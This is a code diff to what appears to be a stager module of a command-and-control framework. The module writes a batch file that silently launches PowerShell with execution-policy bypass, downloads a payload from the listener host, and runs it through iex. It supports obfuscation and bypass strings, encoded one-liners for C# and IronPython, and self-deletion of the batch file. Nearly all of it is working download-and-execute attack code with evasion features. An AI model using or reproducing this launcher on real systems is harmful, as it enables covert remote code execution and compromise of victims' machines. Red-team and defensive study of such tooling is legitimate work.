@@ -34,7 +34,7 @@ class Stager(object):
                 "Description": "Language of the stager to generate.",
                 "Required": True,
                 "Value": "powershell",
-                "SuggestedValues": ["powershell"],
+                "SuggestedValues": ["powershell", "csharp", "ironpython"],
                 "Strict": True,
             },
             "OutFile": {
@@ -84,6 +84,7 @@ class Stager(object):
         obfuscate = self.options["Obfuscate"]["Value"]
         obfuscate_command = self.options["ObfuscateCommand"]["Value"]
         bypasses = self.options["Bypasses"]["Value"]
+        language = self.options["Language"]["Value"]
 
         if obfuscate.lower() == "true":
             obfuscate = True
@@ -93,26 +94,38 @@ class Stager(object):
         listener = self.mainMenu.listenersv2.get_by_name(SessionLocal(), listener_name)
         host = listener.options["Host"]["Value"]
 
-        launcher = f"powershell.exe -nol -w 1 -nop -ep bypass \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('{host}/download/powershell/"
+        if language == "powershell":
+            launcher = f"powershell.exe -nol -w 1 -nop -ep bypass \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('{host}/download/powershell/"
 
-        # generate base64 of obfuscate command for first stage
-        if obfuscate:
-            launcher_obfuscate_command = f"{obfuscate_command}:"
+            # generate base64 of obfuscate command for first stage
+            if obfuscate:
+                launcher_obfuscate_command = f"{obfuscate_command}:"
 
+            else:
+                launcher_obfuscate_command = ":"
+
+            if bypasses:
+                launcher_bypasses = f"{bypasses}"
+            else:
+                launcher_bypasses = ""
+
+            launcher_end = base64.b64encode(
+                (launcher_obfuscate_command + launcher_bypasses).encode("UTF-8")
+            ).decode("UTF-8")
+            launcher_end += "') -UseBasicParsing|iex\""
+
+            launcher = launcher + launcher_end
         else:
-            launcher_obfuscate_command = ":"
+            oneliner = self.mainMenu.stagers.generate_exe_oneliner(
+                language=language,
+                obfuscate=obfuscate,
+                obfuscation_command=obfuscate_command,
+                encode=True,
+                listener_name=listener_name,
+            )
 
-        if bypasses:
-            launcher_bypasses = f"{bypasses}"
-        else:
-            launcher_bypasses = ""
-
-        launcher_end = base64.b64encode(
-            (launcher_obfuscate_command + launcher_bypasses).encode("UTF-8")
-        ).decode("UTF-8")
-        launcher_end += "') -UseBasicParsing|iex\""
-
-        launcher = launcher + launcher_end
+            oneliner = oneliner.split("-enc ")[1]
+            launcher = f"powershell.exe -nol -w 1 -nop -ep bypass -enc {oneliner}"
 
         if host == "":
             log.error("[!] Error in launcher command generation.")
@@ -121,7 +134,6 @@ class Stager(object):
         else:
             code = "@echo off\n"
             code += "start /b " + launcher + "\n"
-
             if delete.lower() == "true":
                 # code that causes the .bat to delete itself
                 code += '(goto) 2>nul & del "%~f0"\n'
